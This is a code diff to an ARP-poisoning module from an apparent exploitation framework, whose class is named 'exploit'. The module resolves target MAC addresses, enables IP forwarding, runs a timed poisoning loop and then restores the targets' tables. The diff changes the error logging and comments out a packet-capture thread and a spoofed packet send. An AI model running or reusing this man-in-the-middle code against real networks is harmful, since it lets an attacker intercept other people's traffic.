@@ -93,17 +93,19 @@ class exploit(Sploit):
 			MAC = list(map(lambda x : self.LoadMAC(x),targets))
 			self.log('[+] DONE')
 		except Exception as e:
-			self.log('[!] [FAIL] Failed to resolve MAC adresses : '+ e)
+			self.log('[!] [FAIL] Failed to resolve MAC adresses : ')
+			self.log(e)
 			sys.exit(1)
 		try:
 			self.log('[*] Enabling IP Forwarding...')
 			self.enable()
 			self.log('[+] DONE')
 		except IOError as e:
-			self.log('[!] [FAIL] Failed to enable IP Forwarding : '+ e)
+			self.log('[!] [FAIL] Failed to enable IP Forwarding : ')
+			self.log(e)
 			sys.exit(1)
-		x = threading.Thread(target=self.capture, args=())
-		x.start()
+		#x = threading.Thread(target=self.capture, args=())
+		#x.start()
 		self.log('[-] Launching Attack...')
 		time_end = time.time() + 60*self.timer
 		while time.time() < time_end:
@@ -115,14 +117,15 @@ class exploit(Sploit):
 				sys.exit(1)
 			pause(2)
 		self.log('[!] Poison finished')
-		send(IP(src='1.2.3.4',dst=targets[0]),iface=self.interface)
-		x.join()
+		#send(IP(src='1.2.3.4',dst=targets[0]),iface=self.interface)
+		#x.join()
 		self.log('[-] Fixing Targets...')
 		for i in range (0,5):
 			try:
 				self.fix(MAC)
 			except Exception as e:
-				self.log("[!] [FAIL] Failed to fix : "+ e)
+				self.log("[!] [FAIL] Failed to fix : ")
+				self.log(e)
 				sys.exit(1)
 			pause(1.5)
 		try:
